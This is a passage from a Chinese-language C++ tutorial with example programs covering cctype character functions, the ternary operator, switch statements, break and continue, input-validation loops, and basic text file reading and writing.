更为常见和普遍接受。除非有特定的编码标准或环境限制要求使用替代表示，否则通常坚持使用符号运算符。 6.3 字符函数库cctypeC++ 继承了 C 语言的一个非常有用的函数库，用于处理字符。这个库的 C++ 头文件是 &lt;cctype&gt;，对应的 C 头文件是 &lt;ctype.h&gt;。它提供了一系列函数，可以方便地检查字符的类别（例如，是否是字母、数字、标点符号、空白等）以及转换字符的大小写。 这些函数通常接收一个 int 类型的参数（该参数值应能表示为 unsigned char 或等于 EOF），并返回一个 int 值。对于测试函数，返回非零值（通常解释为 true）表示条件满足，返回零值（解释为 false）表示条件不满足。对于转换函数，返回转换后的字符的整数表示。 包含头文件: 要使用这些函数，需要包含 &lt;cctype&gt; 头文件： 1#include &lt;cctype&gt; 常用的字符测试函数: 函数名 描述 isalnum(ch) 如果 ch 是字母（isalpha）或数字（isdigit），返回 true。 isalpha(ch) 如果 ch 是字母（大写或小写），返回 true。 isblank(ch) (C++11) 如果 ch 是标准空白字符（通常是空格或水平制表符 \\t），返回 true。 iscntrl(ch) 如果 ch 是控制字符（例如 \\n, \\t, ASCII 0-31 和 127），返回 true。 isdigit(ch) 如果 ch 是十进制数字（’0’ 到 ‘9’），返回 true。 isgraph(ch) 如果 ch 是除空格外的任何可打印字符，返回 true。 islower(ch) 如果 ch 是小写字母，返回 true。 isprint(ch) 如果 ch 是任何可打印字符（包括空格），返回 true。 ispunct(ch) 如果 ch 是标点符号（isgraph 为 true 但 isalnum 为 false），返回 true。 isspace(ch) 如果 ch 是标准空白字符（空格、换页 \\f、换行 \\n、回车 \\r、水平制表符 \\t、垂直制表符 \\v），返回 true。 isupper(ch) 如果 ch 是大写字母，返回 true。 isxdigit(ch) 如果 ch 是十六进制数字（’0’-‘9’, ‘a’-‘f’, ‘A’-‘F’），返回 true。 用法与示例 (测试函数): 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;cctype&gt;#include &lt;string&gt;int main() &#123; std::string text = &quot;Hello World! 123\\t&quot;; int alpha_count = 0; int digit_count = 0; int punct_count = 0; int space_count = 0; std::cout &lt;&lt; &quot;Analyzing text: \\&quot;&quot; &lt;&lt; text &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; for (char ch : text) &#123; if (isalpha(ch)) &#123; alpha_count++; if (isupper(ch)) &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is uppercase alpha.&quot; &lt;&lt; std::endl; &#125; else &#123; // islower(ch) std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is lowercase alpha.&quot; &lt;&lt; std::endl; &#125; &#125; else if (isdigit(ch)) &#123; digit_count++; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is a digit.&quot; &lt;&lt; std::endl; &#125; else if (ispunct(ch)) &#123; punct_count++; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is punctuation.&quot; &lt;&lt; std::endl; &#125; else if (isspace(ch)) &#123; space_count++; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; (ASCII &quot; &lt;&lt; int(ch) &lt;&lt; &quot;) is whitespace.&quot; &lt;&lt; std::endl; &#125; else if (iscntrl(ch)) &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; (ASCII &quot; &lt;&lt; int(ch) &lt;&lt; &quot;) is a control character.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is something else.&quot; &lt;&lt; std::endl; &#125; &#125; std::cout &lt;&lt; &quot;\\nSummary:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Alphabetic: &quot; &lt;&lt; alpha_count &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Digits: &quot; &lt;&lt; digit_count &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Punctuation: &quot; &lt;&lt; punct_count &lt;&lt; std::endl; std::cout &lt;&lt; &quot; Whitespace: &quot; &lt;&lt; space_count &lt;&lt; std::endl; return 0;&#125; 常用的字符转换函数: 函数名 描述 tolower(ch) 如果 ch 是大写字母，返回其对应的小写字母；否则，返回 ch 不变。 toupper(ch) 如果 ch 是小写字母，返回其对应的大写字母；否则，返回 ch 不变。 用法与示例 (转换函数): 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;cctype&gt;#include &lt;string&gt;int main() &#123; std::string message = &quot;CONVERT This Message.&quot;; std::string lower_message = &quot;&quot;; std::string upper_message = &quot;&quot;; // 转换为小写 for (char ch : message) &#123; lower_message += tolower(ch); // 将每个字符转换为小写并附加 &#125; std::cout &lt;&lt; &quot;Original: &quot; &lt;&lt; message &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Lowercase: &quot; &lt;&lt; lower_message &lt;&lt; std::endl; // 转换为大写 for (char ch : message) &#123; upper_message += toupper(ch); // 将每个字符转换为大写并附加 &#125; std::cout &lt;&lt; &quot;Uppercase: &quot; &lt;&lt; upper_message &lt;&lt; std::endl; // 示例：不区分大小写的比较 char response; std::cout &lt;&lt; &quot;\\nDo you want to continue? (Y/N): &quot;; std::cin &gt;&gt; response; if (tolower(response) == &#x27;y&#x27;) &#123; // 将输入转换为小写再比较 std::cout &lt;&lt; &quot;Continuing...&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Exiting...&quot; &lt;&lt; std::endl; &#125; return 0;&#125; &lt;cctype&gt; 库提供了一套标准、可移植的函数来处理字符分类和转换，这在处理用户输入、解析文本或进行不区分大小写的操作时非常有用。 6.4 三元运算符C++ 提供了一个简洁的条件运算符，称为三元运算符（或条件运算符），它是 C++ 中唯一一个需要三个操作数的运算符。它通常用于根据条件将两个值中的一个赋给变量。 用法三元运算符的语法如下： 1condition ? expression1 : expression2; 其工作方式是： 首先计算 condition。 如果 condition 为 true（非零），则计算 expression1，并且整个表达式的值就是 expression1 的值。 如果 condition 为 false（零），则计算 expression2，并且整个表达式的值就是 expression2 的值。 三元运算符通常可以替代简单的 if else 语句，使代码更紧凑。 示例代码下面是一个使用三元运算符查找两个数中较大值的示例： 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; int a = 10; int b = 20; int max_val; // 使用三元运算符找出 a 和 b 中的较大值 max_val = (a &gt; b) ? a : b; std::cout &lt;&lt; &quot;The maximum value between &quot; &lt;&lt; a &lt;&lt; &quot; and &quot; &lt;&lt; b &lt;&lt; &quot; is: &quot; &lt;&lt; max_val &lt;&lt; std::endl; // 输出: The maximum value between 10 and 20 is: 20 // 另一个例子：根据年龄判断是否成年 int age = 15; std::string status = (age &gt;= 18) ? &quot;Adult&quot; : &quot;Minor&quot;; std::cout &lt;&lt; &quot;Age: &quot; &lt;&lt; age &lt;&lt; &quot;, Status: &quot; &lt;&lt; status &lt;&lt; std::endl; // 输出: Age: 15, Status: Minor return 0;&#125; 代码解释: 在第一个示例中，条件 (a &gt; b) 被评估。因为 10 &gt; 20 是 false，所以计算第二个表达式 b，并将 b 的值（即 20）赋给 max_val。 在第二个示例中，条件 (age &gt;= 18) 被评估。因为 15 &gt;= 18 是 false，所以计算第二个表达式 &quot;Minor&quot;，并将这个字符串赋给 status。 优点: 简洁性: 可以用一行代码替代多行的 if else 结构，使代码更紧凑。 缺点: 可读性: 对于复杂的条件或表达式，使用三元运算符可能会降低代码的可读性。在这种情况下，使用 if else 语句通常更好。 三元运算符是 C++ 中一个方便的工具，尤其适用于简单的条件赋值。 6.5 switch 语句switch 语句是 C++ 中另一种用于控制程序流程的分支结构。它允许程序根据一个表达式的值从多个代码块中选择一个来执行。switch 语句通常用于替代冗长的 if else if else 结构，特别是当判断条件基于单个变量或表达式的离散值时。 用法switch 语句的基本语法如下： 123456789101112switch (expression) &#123; case constant_expression_1: // code block to be executed if expression equals constant_expression_1 break; // 可选，但通常需要 case constant_expression_2: // code block to be executed if expression equals constant_expression_2 break; // 可选 // ... 可以有更多的 case default: // 可选 // code block to be executed if expression doesn&#x27;t match any case break; // 可选&#125; 工作方式: 首先计算 switch 括号内的 expression（表达式）。这个表达式必须得出一个整数类型（如 int, char, enum）或可以隐式转换为整数类型的值。 程序将 expression 的值与每个 case 后面跟着的 constant_expression（常量表达式）进行比较。 如果找到匹配的 case，则执行该 case 标签下的代码块。 break 语句的作用是跳出 switch 结构。如果没有 break，程序会继续执行下一个 case 的代码块（称为“贯穿”），直到遇到 break 或 switch 语句结束。 default 标签是可选的。如果 expression 的值与所有 case 的常量表达式都不匹配，则执行 default 标签下的代码块。如果没有 default 标签且没有匹配的 case，则 switch 语句不执行任何操作。 重要限制: case 标签后面的值必须是常量表达式（如字面值 10、&#39;A&#39; 或 const 整数变量，或者枚举量）。不能是变量或非常量表达式。 expression 的结果必须是整数类型（int, char, short, long, long long, bool, enum 等）。不能是浮点数 (float, double) 或字符串 (std::string)。 示例代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;iostream&gt;int main() &#123; int choice; std::cout &lt;&lt; &quot;Enter a number (1-3): &quot;; std::cin &gt;&gt; choice; switch (choice) &#123; case 1: std::cout &lt;&lt; &quot;You chose option 1.&quot; &lt;&lt; std::endl; break; // 跳出 switch case 2: std::cout &lt;&lt; &quot;You chose option 2.&quot; &lt;&lt; std::endl; break; // 跳出 switch case 3: std::cout &lt;&lt; &quot;You chose option 3.&quot; &lt;&lt; std::endl; break; // 跳出 switch default: std::cout &lt;&lt; &quot;Invalid choice.&quot; &lt;&lt; std::endl; // default 后面通常也放 break，虽然在这里不是必需的，但保持一致性是好习惯 break; &#125; // 演示没有 break 的情况 (贯穿) char grade = &#x27;B&#x27;; std::cout &lt;&lt; &quot;\\nGrade example (fall-through):&quot; &lt;&lt; std::endl; switch (grade) &#123; case &#x27;A&#x27;: std::cout &lt;&lt; &quot;Excellent! &quot;; // 没有 break case &#x27;B&#x27;: std::cout &lt;&lt; &quot;Good! &quot;; // 没有 break case &#x27;C&#x27;: std::cout &lt;&lt; &quot;Passing. &quot;; break; // 在这里跳出 case &#x27;D&#x27;: case &#x27;F&#x27;: // 可以将多个 case 关联到同一代码块 std::cout &lt;&lt; &quot;Needs improvement. &quot;; break; default: std::cout &lt;&lt; &quot;Invalid grade. &quot;; break; &#125; std::cout &lt;&lt; std::endl; // 输出: Good! Passing. return 0;&#125; 代码解释: 第一个 switch 根据用户输入的 choice 值执行相应的 case。break 语句确保只执行匹配 case 的代码。如果输入不是 1、2 或 3，则执行 default 部分。 第二个 switch 演示了“贯穿”行为。因为 case &#39;A&#39; 和 case &#39;B&#39; 后面没有 break，当 grade 为 &#39;B&#39; 时，程序会执行 case &#39;B&#39; 的代码 (std::cout &lt;&lt; &quot;Good! &quot;;)，然后继续执行 case &#39;C&#39; 的代码 (std::cout &lt;&lt; &quot;Passing. &quot;;)，直到遇到 case &#39;C&#39; 中的 break 才跳出 switch。同时，它也展示了如何将多个 case（&#39;D&#39; 和 &#39;F&#39;）关联到同一个代码块。 6.5.1 将枚举量用作标签枚举 (enum) 类型的值是整数常量，因此非常适合用作 switch 语句的 case 标签，这可以提高代码的可读性。 123456789101112131415161718192021222324252627#include &lt;iostream&gt;// 定义一个枚举类型表示颜色enum Color &#123; RED, GREEN, BLUE, YELLOW &#125;;int main() &#123; Color selectedColor = GREEN; switch (selectedColor) &#123; case RED: std::cout &lt;&lt; &quot;The color is Red.&quot; &lt;&lt; std::endl; break; case GREEN: std::cout &lt;&lt; &quot;The color is Green.&quot; &lt;&lt; std::endl; // 这将被执行 break; case BLUE: std::cout &lt;&lt; &quot;The color is Blue.&quot; &lt;&lt; std::endl; break; // 注意：如果 case 覆盖了所有枚举量，可以省略 default， // 但如果枚举可能扩展，或者你想处理无效值，最好加上 default。 default: std::cout &lt;&lt; &quot;Unknown color.&quot; &lt;&lt; std::endl; break; &#125; return 0;&#125; 使用枚举量作为 case 标签比直接使用魔法数字（如 0, 1, 2）更清晰易懂。 6.5.2 switch 和 if elseswitch 语句可以看作是特定类型的 if else if else 结构的替代品，即判断条件都基于同一个整数表达式的值。 何时使用 switch: 当需要根据单个整数表达式的多个特定离散值进行分支时。 当分支逻辑清晰，可以提高可读性时。 何时使用 if else if else: 当判断条件涉及范围（例如 age &gt; 18 &amp;&amp; age &lt; 60）时。 当判断条件涉及浮点数或字符串比较时。 当判断条件比较复杂，涉及多个不同变量或逻辑运算时。 当只有一个或两个分支时，if else 可能更简洁。 示例比较: 123456789101112131415161718192021222324252627// 使用 if else ifint num = 2;if (num == 1) &#123; std::cout &lt;&lt; &quot;One&quot; &lt;&lt; std::endl;&#125; else if (num == 2) &#123; std::cout &lt;&lt; &quot;Two&quot; &lt;&lt; std::endl; // 执行&#125; else if (num == 3) &#123; std::cout &lt;&lt; &quot;Three&quot; &lt;&lt; std::endl;&#125; else &#123; std::cout &lt;&lt; &quot;Other&quot; &lt;&lt; std::endl;&#125;// 使用 switch (等效)switch (num) &#123; case 1: std::cout &lt;&lt; &quot;One&quot; &lt;&lt; std::endl; break; case 2: std::cout &lt;&lt; &quot;Two&quot; &lt;&lt; std::endl; // 执行 break; case 3: std::cout &lt;&lt; &quot;Three&quot; &lt;&lt; std::endl; break; default: std::cout &lt;&lt; &quot;Other&quot; &lt;&lt; std::endl; break;&#125; 对于这种基于单个整数值的多路分支，switch 通常被认为更清晰、有时效率也可能更高（编译器可能将其优化为跳转表）。但对于涉及范围或非整数类型的判断，则必须使用 if else if 结构。 6.6 break 和 continue 语句C++ 提供了两个特殊的语句，break 和 continue，用于在循环（for, while, do while）或 switch 语句内部改变正常的执行流程。 6.6.1 break 语句break 语句用于立即终止包含它的最内层的循环（for, while, do while）或 switch 语句的执行。程序控制流会跳转到该循环或 switch 语句之后的下一条语句。 用法: 在循环中: 当满足某个特定条件时，提前退出循环。 在 switch 语句中: 防止“贯穿”（fall-through）到下一个 case，在执行完匹配的 case 代码块后跳出 switch 结构（如 6.5 节所述）。 示例 (在循环中使用): 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;int main() &#123; // 查找数组中第一个负数的位置 int numbers[] = &#123;10, 5, 0, -2, 8, -5&#125;; int found_index = -1; // 初始化为 -1，表示未找到 std::cout &lt;&lt; &quot;Searching for the first negative number...&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; 6; ++i) &#123; std::cout &lt;&lt; &quot;Checking index &quot; &lt;&lt; i &lt;&lt; &quot;, value: &quot; &lt;&lt; numbers[i] &lt;&lt; std::endl; if (numbers[i] &lt; 0) &#123; found_index = i; std::cout &lt;&lt; &quot;Negative number found at index &quot; &lt;&lt; i &lt;&lt; &quot;. Breaking loop.&quot; &lt;&lt; std::endl; break; // 找到第一个负数，立即跳出 for 循环 &#125; &#125; if (found_index != -1) &#123; std::cout &lt;&lt; &quot;The loop was terminated early.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;No negative number found in the array.&quot; &lt;&lt; std::endl; &#125; // 演示在嵌套循环中的作用 std::cout &lt;&lt; &quot;\\nNested loop example:&quot; &lt;&lt; std::endl; for (int i = 1; i &lt;= 3; ++i) &#123; for (int j = 1; j &lt;= 3; ++j) &#123; if (i == 2 &amp;&amp; j == 2) &#123; std::cout &lt;&lt; &quot;Breaking inner loop at i=&quot; &lt;&lt; i &lt;&lt; &quot;, j=&quot; &lt;&lt; j &lt;&lt; std::endl; break; // 只跳出内层循环 (j 循环) &#125; std::cout &lt;&lt; &quot;i=&quot; &lt;&lt; i &lt;&lt; &quot;, j=&quot; &lt;&lt; j &lt;&lt; std::endl; &#125; // break 后，控制流会到达这里，继续外层循环的下一次迭代 std::cout &lt;&lt; &quot;End of inner loop for i=&quot; &lt;&lt; i &lt;&lt; std::endl; &#125; return 0;&#125; 代码解释: 第一个循环遍历 numbers 数组。当 i 为 3 时，numbers[3] 是 -2，满足 if 条件。found_index 被设为 3，打印消息，然后 break 语句被执行，立即终止 for 循环。后面的元素（8 和 -5）不会被检查。 在嵌套循环示例中，当 i 为 2 且 j 为 2 时，break 语句执行。它只终止了最内层的 j 循环。外层的 i 循环继续执行其下一次迭代（当 i 为 3 时）。 6.6.2 continue 语句continue 语句用于跳过当前循环迭代中剩余的代码，并立即开始下一次迭代。与 break 不同，continue 不会终止整个循环。 用法: 在 while 和 do while 循环中: 控制流跳转到循环条件的判断处。 在 for 循环中: 控制流首先跳转到 for 循环的更新表达式（例如 ++i），然后跳转到循环条件的判断处。 示例: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;int main() &#123; // 打印 1 到 10 之间的奇数 std::cout &lt;&lt; &quot;Odd numbers between 1 and 10:&quot; &lt;&lt; std::endl; for (int i = 1; i &lt;= 10; ++i) &#123; if (i % 2 == 0) &#123; // 如果 i 是偶数 continue; // 跳过本次迭代剩余的部分 (cout 语句)，直接进行下一次迭代 (i++) &#125; // 只有当 i 是奇数时，才会执行这行代码 std::cout &lt;&lt; i &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // 输出: 1 3 5 7 9 // 演示在 while 循环中 std::cout &lt;&lt; &quot;\\nSkipping number 5 in while loop (1 to 7):&quot; &lt;&lt; std::endl; int k = 0; while (k &lt; 7) &#123; k++; // 先递增 k if (k == 5) &#123; std::cout &lt;&lt; &quot;(Skipping 5) &quot;; continue; // 跳过本次迭代的 cout &#125; std::cout &lt;&lt; k &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // 输出: 1 2 3 4 (Skipping 5) 6 7 return 0;&#125; 代码解释: 在 for 循环中，当 i 是偶数时（i % 2 == 0 为真），continue 语句执行。它跳过了 std::cout &lt;&lt; i &lt;&lt; &quot; &quot;; 这行代码，直接执行更新表达式 ++i，然后判断循环条件 i &lt;= 10。因此，只有奇数被打印出来。 在 while 循环中，当 k 递增到 5 时，if 条件满足，continue 执行，跳过了 std::cout &lt;&lt; k &lt;&lt; &quot; &quot;;，直接回到 while (k &lt; 7) 的条件判断。 总结 break: 完全终止最内层的循环或 switch。 continue: 跳过当前循环迭代的剩余部分，进入下一次迭代（如果循环条件允许）。 这两个语句可以使循环控制更加灵活，但过度使用可能会降低代码的可读性。通常，可以通过调整循环条件或使用 if 语句来避免一些不必要的 break 或 continue。 6.7 读取数字的循环在 C++ 程序中，经常需要编写循环来读取用户的数字输入，直到满足某个条件（例如输入特定值或遇到无效输入）为止。然而，处理数字输入，特别是处理潜在的错误输入，需要一些技巧。 基本的数字读取循环一个简单的读取数字并累加的循环可能如下所示： 123456789101112131415161718192021#include &lt;iostream&gt;int main() &#123; int sum = 0; int input_number; std::cout &lt;&lt; &quot;Enter numbers to sum (enter a non-number to quit): &quot;; // 尝试读取一个整数，如果成功，cin 返回 true while (std::cin &gt;&gt; input_number) &#123; sum += input_number; std::cout &lt;&lt; &quot;Current sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Enter next number: &quot;; &#125; // 当输入非数字时，循环结束 std::cout &lt;&lt; &quot;\\nLoop terminated.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Final sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; return 0;&#125; 工作方式: std::cin &gt;&gt; input_number 尝试从输入流中读取一个整数并存储到 input_number 中。 这个表达式本身会返回 std::cin 对象。在需要布尔值的上下文中（如 while 的条件），std::cin 对象会根据流的状态转换为 true 或 false。 如果成功读取一个整数，流状态是正常的，std::cin 转换为 true，循环体执行。 如果用户输入了非数字（例如输入 “hello” 或按 Ctrl+Z/Ctrl+D 表示文件结束），std::cin &gt;&gt; input_number 会失败。此时，std::cin 会进入“失败”（fail）状态，转换为 false，循环终止。 处理错误输入上面的简单循环在遇到非数字输入时会终止，但它没有明确地处理错误状态。如果循环结束后还需要继续从 std::cin 读取其他类型的输入，就需要清除错误状态并丢弃无效的输入。 问题: 当 std::cin &gt;&gt; input_number 失败时，输入流 std::cin 会设置一个错误标志（failbit），并且导致失败的输入（例如 “hello”）仍然留在输入缓冲区中。如果不处理，后续的 std::cin 操作通常也会立即失败。 解决方案: 清除错误状态: 使用 std::cin.clear() 方法重置流的错误标志。 忽略无效输入: 使用 std::cin.ignore() 方法丢弃输入缓冲区中不需要的字符。通常会忽略直到下一个换行符 \\n 或达到某个最大字符数。 示例 (更健壮的数字读取循环): 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;iostream&gt;#include &lt;limits&gt; // 需要包含 &lt;limits&gt; 来使用 numeric_limitsint main() &#123; int sum = 0; int input_number; std::cout &lt;&lt; &quot;Enter numbers to sum (enter a non-number to quit): &quot;; while (true) &#123; // 使用无限循环，内部处理退出条件 std::cout &lt;&lt; &quot;Enter a number: &quot;; if (std::cin &gt;&gt; input_number) &#123; // 成功读取数字 sum += input_number; std::cout &lt;&lt; &quot;Current sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; &#125; else &#123; // 读取失败 (输入了非数字或 EOF) std::cout &lt;&lt; &quot;Invalid input detected or EOF reached.&quot; &lt;&lt; std::endl; // 检查是否是文件结束符 (EOF) if (std::cin.eof()) &#123; std::cout &lt;&lt; &quot;End of file reached. Exiting.&quot; &lt;&lt; std::endl; break; // 如果是 EOF，直接退出循环 &#125; // 清除错误标志，使 cin 恢复正常 std::cout &lt;&lt; &quot;Clearing error state...&quot; &lt;&lt; std::endl; std::cin.clear(); // 丢弃缓冲区中导致错误的无效输入，直到换行符 std::cout &lt;&lt; &quot;Discarding invalid input...&quot; &lt;&lt; std::endl; std::cin.ignore(std::numeric_limits&lt;std::streamsize&gt;::max(), &#x27;\\n&#x27;); std::cout &lt;&lt; &quot;Please try entering a number again, or press Ctrl+Z/Ctrl+D to exit.&quot; &lt;&lt; std::endl; // 注意：在这个版本中，遇到非数字输入后，我们提示用户重试或退出， // 而不是像第一个例子那样直接终止求和。 // 如果希望遇到非数字就退出，可以在 else 块的末尾加上 break; // break; // 取消注释此行，则遇到非数字输入时退出循环 &#125; &#125; std::cout &lt;&lt; &quot;\\nLoop finished.&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Final sum: &quot; &lt;&lt; sum &lt;&lt; std::endl; // 可以在这里尝试读取其他输入，因为错误状态已被清除 std::string remaining_input; std::cout &lt;&lt; &quot;\\nEnter some text: &quot;; // 需要先忽略掉上次输入留下的换行符（如果存在） if (std::cin.peek() == &#x27;\\n&#x27;) &#123; std::cin.ignore(); &#125; std::getline(std::cin, remaining_input); std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; remaining_input &lt;&lt; std::endl; return 0;&#125; 代码解释: 使用 while(true) 创建一个看似无限的循环，退出逻辑放在循环内部。 if (std::cin &gt;&gt; input_number) 尝试读取数字。 如果成功，执行加法。 如果失败 (else 块)： 打印错误消息。 检查是否是文件结束符 (std::cin.eof())，如果是则 break。 调用 std::cin.clear() 清除 failbit 等错误状态。 调用 std::cin.ignore(...) 来丢弃缓冲区中的无效输入。std::numeric_limits&lt;std::streamsize&gt;::max() 表示忽略尽可能多的字符，直到遇到换行符 \\n。这确保了下一次循环迭代时，std::cin 不会再次读取相同的无效输入。 根据需要，可以选择 break 退出，或者让循环继续，提示用户重新输入。 这种模式在需要从用户那里可靠地读取数字输入时非常有用，因为它能优雅地处理输入错误，而不是让程序因为意外的输入而崩溃或行为异常。 6.8 简单文件输入/输出到目前为止，我们主要使用 cin 从键盘读取输入，用 cout 向屏幕显示输出。C++ 还提供了强大的功能，可以让我们将数据写入文件或从文件中读取数据。这对于存储程序运行结果、读取配置文件或处理大量数据至关重要。本节将介绍基本的文本文件输入/输出（I/O）操作。 6.8.1 文本 I/O 和文本文件文件 I/O 主要有两种模式：文本模式和二进制模式。 文本文件 (Text File): 文本文件存储的是人类可读的字符序列。文件中的数据被解释为字符，数字（如 123）会被存储为字符序列（&#39;1&#39;, &#39;2&#39;, &#39;3&#39;）。在不同的操作系统上，文本文件对行尾的处理可能不同（例如，Windows 使用回车+换行 \\r\\n，Unix/Linux 使用换行 \\n）。C++ 的文本 I/O 会自动处理这些行尾转换，使得代码更具可移植性。我们通常使用 &lt;&lt; 和 &gt;&gt; 或 getline 等函数来处理文本文件。 二进制文件 (Binary File): 二进制文件存储的是数据的原始字节表示。数字 123 会被存储为其在内存中的二进制形式（例如，一个 4 字节的 int）。二进制 I/O 不进行任何字符转换或行尾处理，读写速度通常更快，文件也可能更小，但内容通常不是人类直接可读的。处理二进制文件通常使用 read() 和 write() 成员函数。 本节重点介绍文本文件的 I/O 操作。 6.8.2 写入到文本文件中要将数据写入文本文件，我们需要使用 C++ 的文件流库 &lt;fstream&gt;。 步骤: 包含头文件: #include &lt;fstream&gt; 创建 ofstream 对象: ofstream 类（output file stream）用于向文件写入数据。你需要创建一个该类的对象，并在创建时或之后将其与一个文件名关联起来。 1234std::ofstream outputFile; // 创建 ofstream 对象outputFile.open(&quot;mydata.txt&quot;); // 将对象与文件关联（如果文件不存在则创建，如果存在则清空内容）// 或者在创建时直接关联// std::ofstream outputFile(&quot;mydata.txt&quot;); 检查文件是否成功打开: 在尝试写入之前，最好检查文件是否成功打开。可以使用 is_open() 方法或直接检查流对象的状态。 1234if (!outputFile.is_open()) &#123; // 或者 if (!outputFile) std::cerr &lt;&lt; &quot;Error opening file for writing!&quot; &lt;&lt; std::endl; return 1; // 或者进行其他错误处理&#125; 写入数据: 使用与 cout 类似的 &lt;&lt; 运算符将数据写入文件流。 123456int year = 2024;double price = 99.99;std::string item = &quot;Gadget&quot;;outputFile &lt;&lt; &quot;Item: &quot; &lt;&lt; item &lt;&lt; std::endl;outputFile &lt;&lt; &quot;Year: &quot; &lt;&lt; year &lt;&lt; std::endl;outputFile &lt;&lt; &quot;Price: &quot; &lt;&lt; price &lt;&lt; std::endl; 关闭文件: 完成写入后，应该关闭文件以确保所有数据都被刷新（写入）到磁盘，并释放文件资源。可以显式调用 close() 方法，或者当 ofstream 对象离开其作用域时（例如函数结束），其析构函数会自动关闭文件。 1outputFile.close(); // 显式关闭 示例代码: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;fstream&gt; // 包含文件流头文件#include &lt;string&gt;int main() &#123; // 1. 创建 ofstream 对象并关联文件 std::ofstream outFile(&quot;report.txt&quot;); // 尝试打开/创建 report.txt // 2. 检查文件是否成功打开 if (!outFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Could not open report.txt for writing.&quot; &lt;&lt; std::endl; return 1; // 返回错误码 &#125; // 3. 写入数据 std::cout &lt;&lt; &quot;Writing data to report.txt...&quot; &lt;&lt; std::endl; outFile &lt;&lt; &quot;--- Sales Report ---&quot; &lt;&lt; std::endl; outFile &lt;&lt; &quot;Product: Laptop&quot; &lt;&lt; std::endl; outFile &lt;&lt; &quot;Quantity: 15&quot; &lt;&lt; std::endl; outFile &lt;&lt; &quot;Revenue: &quot; &lt;&lt; 15 * 1200.50 &lt;&lt; std::endl; outFile &lt;&lt; &quot;--------------------&quot; &lt;&lt; std::endl; // 4. 关闭文件 (虽然析构函数会自动关闭，但显式关闭是好习惯) outFile.close(); std::cout &lt;&lt; &quot;Data written successfully.&quot; &lt;&lt; std::endl; return 0;&#125; 运行此程序后，将在程序所在的目录下创建一个名为 report.txt 的文件（如果不存在），其内容如下： 12345--- Sales Report ---Product: LaptopQuantity: 15Revenue: 18007.5-------------------- 6.8.3 读取文本文件从文本文件读取数据与写入类似，但使用 ifstream 类（input file stream）。 步骤: 包含头文件: #include &lt;fstream&gt; 创建 ifstream 对象: 创建一个 ifstream 对象并将其与要读取的文件名关联。 1234std::ifstream inputFile; // 创建 ifstream 对象inputFile.open(&quot;mydata.txt&quot;); // 将对象与文件关联以供读取// 或者在创建时直接关联// std::ifstream inputFile(&quot;mydata.txt&quot;); 检查文件是否成功打开: 同样，检查文件是否成功打开至关重要。如果文件不存在或无法访问，打开操作会失败。 1234if (!inputFile.is_open()) &#123; // 或者 if (!inputFile) std::cerr &lt;&lt; &quot;Error opening file for reading!&quot; &lt;&lt; std::endl; return 1;&#125; 读取数据: 可以使用与 cin 类似的 &gt;&gt; 运算符来读取由空格分隔的数据，或者使用 std::getline() 来读取整行。读取操作通常放在循环中，直到到达文件末尾。 使用 &gt;&gt; 读取: 它会跳过前导空白（空格、制表符、换行符），然后读取直到遇到下一个空白字符。 使用 std::getline(inputFile, lineString) 读取: 它会读取整行（包括空格），直到遇到换行符 \\n 为止（换行符本身会被读取并丢弃）。 检查文件末尾 (EOF): 当尝试读取但已无数据可读时（到达文件末尾），输入流会进入特殊状态。循环通常依赖于检查流的状态来终止。 while (inputFile &gt;&gt; variable): 当 &gt;&gt; 成功读取时，流状态为 true，循环继续；到达文件末尾或遇到无效数据时，状态变为 false，循环终止。 while (std::getline(inputFile, lineString)): 当 getline 成功读取一行时，流状态为 true；到达文件末尾时，状态变为 false。 关闭文件: 读取完成后，关闭文件。同样，可以显式调用 close()，或者依赖对象的析构函数。 1inputFile.close(); 示例代码 (读取 report.txt): 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#include &lt;iostream&gt;#include &lt;fstream&gt;#include &lt;string&gt;#include &lt;vector&gt; // 用于存储读取的行int main() &#123; // 1. 创建 ifstream 对象并关联文件 std::ifstream inFile(&quot;report.txt&quot;); // 2. 检查文件是否成功打开 if (!inFile.is_open()) &#123; std::cerr &lt;&lt; &quot;Could not open report.txt for reading.&quot; &lt;&lt; std::endl; return 1; &#125; std::cout &lt;&lt; &quot;Reading data from report.txt using getline:&quot; &lt;&lt; std::endl; 